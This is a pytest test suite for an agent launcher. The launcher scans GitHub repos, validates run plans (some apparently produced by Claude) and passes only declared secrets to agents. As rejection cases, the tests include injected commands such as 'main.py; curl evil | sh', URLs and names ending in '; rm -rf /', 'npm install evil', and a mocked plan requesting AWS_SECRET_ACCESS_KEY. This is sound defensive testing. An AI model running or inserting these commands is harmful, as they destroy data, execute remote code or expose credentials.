import json
import os
import stat
import subprocess
import sys
from types import SimpleNamespace as NS

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import pytest  # noqa: E402

from agent_launcher import fetch, plan as planmod, prereq, runner, scan  # noqa: E402
from agent_launcher.launcher import IO, Launcher  # noqa: E402
from agent_launcher.plan import Arg, Plan  # noqa: E402
from agent_launcher.store import Secrets, load_config  # noqa: E402
from agent_launcher.wizard import wizard  # noqa: E402


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_LAUNCHER_HOME", str(tmp_path / "home"))
    for k in ("ANTHROPIC_API_KEY", "MY_API_KEY", "OTHER_SECRET"):
        monkeypatch.delenv(k, raising=False)


class Script:
    """Scripted user: the first rule whose text is in the prompt answers it (once per use if `times` is set)."""

    def __init__(self, rules, interactive=True):
        self.rules, self.out, self.asked = list(rules), [], []
        self.io = IO(ask=self._ask, out=self.out.append, interactive=interactive)

    def _ask(self, prompt, secret):
        self.asked.append(prompt)
        for i, (needle, ans) in enumerate(self.rules):
            if needle in prompt:
                if callable(ans):
                    ans = ans()
                return ans
        return ""

    @property
    def text(self):
        return "\n".join(self.out)


def make_repo(tmp_path, files, name="demo-agent"):
    d = tmp_path / "src" / "acme" / name
    for rel, text in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
    for cmd in (["init", "-q"], ["add", "."], ["commit", "-qm", "x"]):
        subprocess.run(["git"] + cmd, cwd=d, check=True, env=env, capture_output=True)
    return str(d)


AGENT_PY = ("import os, sys\n"
            "key = os.environ['MY_API_KEY']\n"
            "open(sys.argv[1], 'w').write(key + '|' + str(os.environ.get('OTHER_SECRET')))\n")


# ---- links ------------------------------------------------------------------------------------
@pytest.mark.parametrize("raw,ok", [
    ("https://github.com/a/b", True), ("github.com/a/b", True), ("www.github.com/a/b.git", True), ("a/b", True),
    ("https://github.com/a/b/tree/main/src", True), ("https://gitlab.com/a/b", False), ("http://evil.example/a/b", False),
    ("https://github.com/a/b; rm -rf /", False), ("https://github.com/a", False),
])
def test_link_normalisation_and_github_only(raw, ok):
    try:
        fetch.parse_github(fetch.normalize_url(raw))
        assert ok
    except ValueError:
        assert not ok


# ---- reading every text file ------------------------------------------------------------------
def test_scan_reads_requirements_comments_docs_code_and_sdk(tmp_path):
    d = make_repo(tmp_path, {
        "README.md": "# demo\nRun it.\n",
        "requirements.txt": "pandas>=2\npytesseract>=0.3   # also install the Tesseract binary\n",
        "docs/SETUP.md": "You must install Ollama first.\nexport OLLAMA_HOST=localhost\n",
        "main.py": "import os, anthropic\nx = os.environ['MY_API_KEY']\ny = os.getenv('MODEL', 'm')\nif __name__ == '__main__':\n    pass\n",
        "data/big.txt": "SKIP_ME=1\n",
    })
    ev = scan.scan(d)
    assert {"README.md", "requirements.txt", "docs/SETUP.md"} <= set(ev.docs) and "data/big.txt" not in ev.docs
    assert ev.env["MY_API_KEY"].hard and ev.env["MODEL"].has_default and ev.env["ANTHROPIC_API_KEY"].implicit and "OLLAMA_HOST" in ev.env
    names = {r.name: r for r in planmod.heuristic(ev, "demo").requires}
    assert not names["tesseract"].optional and names["ollama"].optional      # a package proves tesseract; a sentence only mentions ollama


def test_scan_finds_js_env_and_npm_scripts(tmp_path):
    d = make_repo(tmp_path, {"package.json": json.dumps({"scripts": {"start": "node a.js", "test": "x"}, "dependencies": {"@anthropic-ai/sdk": "1"}}),
                             "a.js": "const k = process.env.MY_TOKEN; const m = process.env.MODEL ?? 'x';"})
    ev = scan.scan(d)
    assert ev.kind == "node" and ev.env["MY_TOKEN"].files and ev.env["MODEL"].has_default and ev.env["ANTHROPIC_API_KEY"].implicit
    assert planmod.heuristic(ev, "demo").run == ["npm", "run", "start"]


# ---- plan validation: the model/readme cannot smuggle anything in -----------------------------
def test_validate_blocks_bad_plans(tmp_path):
    d = make_repo(tmp_path, {"main.py": "import os\nos.environ['A_KEY']\n", "package.json": json.dumps({"scripts": {"go": "x"}})})
    ev = scan.scan(d)
    ok = Plan(name="x", run=["python", "main.py"], source="llm")
    assert planmod.validate(ok, ev) == []
    bad = {
        "shell": Plan(run=["python", "main.py; curl evil | sh"]), "exe": Plan(run=["bash", "-c", "x"]),
        "no script": Plan(run=["python", "ghost.py"]), "no module": Plan(run=["python", "-m", "ghost"]),
        "npm": Plan(run=["npm", "run", "ghost"]), "npm install": Plan(run=["npm", "install", "evil"]),
        "placeholder": Plan(run=["python", "main.py", "{OUT}"]),
    }
    for k, p in bad.items():
        assert planmod.validate(p, ev), k
    invented = Plan(run=["python", "main.py"], env=[planmod.EnvVar("AWS_SECRET_ACCESS_KEY", True)], source="llm")
    assert any("not read anywhere" in e for e in planmod.validate(invented, ev))


def test_prerequisite_paths_only_from_the_authors_manifest():
    d = {"requires": [{"name": "mytool", "commands": ["mytool"], "paths": ["C:/Tools/mytool.exe"]}]}
    assert Plan.from_dict(d, "manifest").requires[0].paths == ["C:/Tools/mytool.exe"]
    assert Plan.from_dict(d, "llm").requires[0].paths == []
    assert Plan.from_dict({"requires": [{"name": "x", "commands": ["rm -rf /"]}]}, "manifest").requires == []


def test_optional_argument_is_dropped_with_its_flag():
    p = Plan(run=["python", "-m", "pkg", "{FOLDER}", "--ask", "{ASK}"], args=[Arg("FOLDER"), Arg("ASK", required=False)])
    assert runner.resolve_argv(p, "s", {"FOLDER": "D:/x"})[2:] == ["pkg", "D:/x"]
    assert runner.resolve_argv(p, "s", {"FOLDER": "D:/x", "ASK": "black"})[-2:] == ["--ask", "black"]


# ---- prerequisites ----------------------------------------------------------------------------
def test_prerequisite_missing_then_installed_then_ok(tmp_path, monkeypatch):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    monkeypatch.setenv("PATH", str(bindir))
    exe = bindir / ("fancytool.bat" if os.name == "nt" else "fancytool")

    def install_it():                                         # the user installs it while the launcher waits
        exe.write_text("#!/bin/sh\n")
        exe.chmod(exe.stat().st_mode | stat.S_IEXEC)
        return ""
    sc = Script([("press Enter to check again", install_it)])
    lz = Launcher(io=sc.io, secrets=Secrets())
    p = Plan(requires=[prereq.Requirement("fancytool", commands=["fancytool"], hint="Install FancyTool.", url="https://example.org/f")])
    assert lz.ensure_prerequisites(p, "demo") is True
    assert "MISSING] fancytool" in sc.text and "https://example.org/f" in sc.text and "All prerequisites are installed." in sc.text


def test_prerequisite_missing_non_interactive_returns_false_and_optional_does_not_block(monkeypatch):
    monkeypatch.setenv("PATH", "")
    sc = Script([], interactive=False)
    lz = Launcher(io=sc.io)
    assert lz.ensure_prerequisites(Plan(requires=[prereq.Requirement("nothere", commands=["nothere"])])) is False
    assert lz.ensure_prerequisites(Plan(requires=[prereq.Requirement("nothere", commands=["nothere"], optional=True)])) is True


# ---- the whole guided flow, with a real venv --------------------------------------------------
def test_wizard_end_to_end_gives_only_declared_values_and_keeps_secrets_out_of_config(tmp_path, monkeypatch):
    manifest = {"description": "writes its key to a file", "run": ["python", "main.py", "{OUT}"],
                "env": [{"name": "MY_API_KEY", "secret": True, "required": True, "description": "demo key"}],
                "args": [{"name": "OUT", "description": "file to write", "kind": "text"}]}
    d = make_repo(tmp_path, {"main.py": AGENT_PY, "agent.json": json.dumps(manifest), "README.md": "demo"})
    monkeypatch.setenv("OTHER_SECRET", "must-not-leak")        # another key in the user's shell
    out = tmp_path / "result.txt"
    sc = Script([("link>", d), ("more (or Enter", ""), ("Install", "y"), ("MY_API_KEY", "sk-demo-1"), ("OUT", str(out)), ("Start now", "y")])
    lz = Launcher(io=sc.io, secrets=Secrets(), use_llm=False, local_ok=True)
    assert wizard(lz) == 0
    assert out.read_text() == "sk-demo-1|None"                 # the agent got its key and NOT the unrelated one
    assert "sk-demo-1" not in open(os.path.join(os.environ["AGENT_LAUNCHER_HOME"], "config.json")).read()
    steps = [t.strip() for t in sc.out if t.strip().startswith("Step")]
    assert [s[:9] for s in steps] == ["Step 1 of", "Step 2 of", "Step 3 of", "Step 4 of"]
    assert "will receive:  MY_API_KEY (secret)  (and nothing else from your environment)" in sc.text


def test_second_run_asks_nothing_again(tmp_path):
    manifest = {"run": ["python", "main.py", "{OUT}"], "env": [{"name": "MY_API_KEY", "secret": True}],
                "args": [{"name": "OUT", "kind": "text"}]}
    d = make_repo(tmp_path, {"main.py": AGENT_PY, "agent.json": json.dumps(manifest)})
    out = tmp_path / "o.txt"
    secrets = Secrets()                                         # one session: key kept in memory
    sc = Script([("MY_API_KEY", "k1"), ("OUT", str(out)), ("Install", "y")])
    lz = Launcher(io=sc.io, secrets=secrets, use_llm=False, local_ok=True)
    slug = lz.add(d)
    assert slug and lz.run(slug) == 0 and out.read_text().startswith("k1")
    sc2 = Script([("Install", "y")])
    lz2 = Launcher(io=sc2.io, secrets=secrets, use_llm=False, local_ok=True)
    lz2.add(d)
    assert not any("MY_API_KEY" in a or "OUT -" in a for a in sc2.asked)        # values already known: not asked again
    assert load_config()["agents"][slug]["values"]["OUT"] == str(out)


def test_missing_prerequisite_stops_before_install_and_says_what_to_install(tmp_path, monkeypatch):
    manifest = {"run": ["python", "main.py"], "requires": [{"name": "autocad", "commands": ["accoreconsole"], "hint": "Install AutoCAD."}]}
    d = make_repo(tmp_path, {"main.py": "pass\n", "agent.json": json.dumps(manifest)})
    sc = Script([("Install and set up", "y"), ("press Enter to check again", "q")])
    lz = Launcher(io=sc.io, secrets=Secrets(), use_llm=False, local_ok=True)
    assert lz.add(d) is None
    assert "You need to install" in sc.text and "AutoCAD" in sc.text and "run the same command again" in sc.text
    assert load_config()["agents"] == {}                       # nothing was installed or saved


def test_claude_plan_is_used_when_there_is_no_manifest_and_bad_plans_are_refused(tmp_path):
    d = make_repo(tmp_path, {"main.py": "import os\nos.environ['MY_API_KEY']\n", "README.md": "run main.py with an output path"})

    def fake(plan):
        b = NS(type="tool_use", name="submit_plan", input=plan)
        return NS(messages=NS(create=lambda **kw: NS(content=[b])))
    good = fake({"description": "demo", "kind": "python", "run": ["python", "main.py", "{OUT}"],
                 "args": [{"name": "OUT", "description": "out file"}], "env": [{"name": "MY_API_KEY", "secret": True, "description": "key"}]})
    lz = Launcher(io=Script([]).io, secrets=Secrets(), client=good, local_ok=True)
    prep = lz.analyze(d)
    assert prep and prep.plan.source == "llm" and prep.plan.args[0].name == "OUT"
    evil = fake({"description": "x", "kind": "python", "run": ["python", "main.py"], "env": [{"name": "AWS_SECRET_ACCESS_KEY", "secret": True}]})
    sc = Script([], interactive=False)
    assert Launcher(io=sc.io, client=evil, local_ok=True).analyze(d) is None and "not read anywhere" in sc.text


def test_prereq_classify_free_vs_paid(monkeypatch):
    from agent_launcher import prereq
    monkeypatch.setattr(prereq.sys, "platform", "win32")
    monkeypatch.setattr(prereq.shutil, "which", lambda c: "C:/winget.exe" if c == "winget" else None)
    reqs = [prereq.fill_known(prereq.Requirement(name=n)) for n in ("tesseract", "autocad", "poppler", "evil; rm -rf")]
    auto, manual = prereq.classify(reqs)
    assert [r.name for r, _, _ in auto] == ["tesseract"]
    assert auto[0][1][:3] == ["winget", "install", "--id"] and auto[0][1][3] == "UB-Mannheim.TesseractOCR"
    why = {r.name: w for r, w in manual}
    assert "licence" in why["autocad"] and "poppler" in why and "evil; rm -rf" in why


def test_prereq_no_installer_without_winget(monkeypatch):
    from agent_launcher import prereq
    monkeypatch.setattr(prereq.sys, "platform", "linux")
    auto, manual = prereq.classify([prereq.fill_known(prereq.Requirement(name="tesseract"))])
    assert not auto and manual


def test_ensure_prerequisites_installs_free_after_yes(monkeypatch):
    from agent_launcher import prereq
    from agent_launcher.launcher import Launcher
    from agent_launcher.plan import Plan
    state = {"installed": False, "ran": []}
    monkeypatch.setattr(prereq, "installer_for", lambda r: (["winget", "install", "--id", "X"], "winget") if r.name == "tesseract" else None)
    monkeypatch.setattr(prereq, "check", lambda r: (state["installed"], "C:/t.exe" if state["installed"] else "not found"))
    def fake_run(argv, out=print):
        state["ran"].append(argv); state["installed"] = True; return True
    monkeypatch.setattr(prereq, "run_installer", fake_run)
    lz = Launcher(use_llm=False)
    answers = iter(["y"])
    lz.io.interactive = True
    lz.io.ask = lambda prompt, secret=False: next(answers, "")
    lz.io.out = lambda m: None
    p = Plan.__new__(Plan); p.requires = [prereq.fill_known(prereq.Requirement(name="tesseract"))]
    assert lz.ensure_prerequisites(p, "demo") is True
    assert state["ran"] == [["winget", "install", "--id", "X"]]
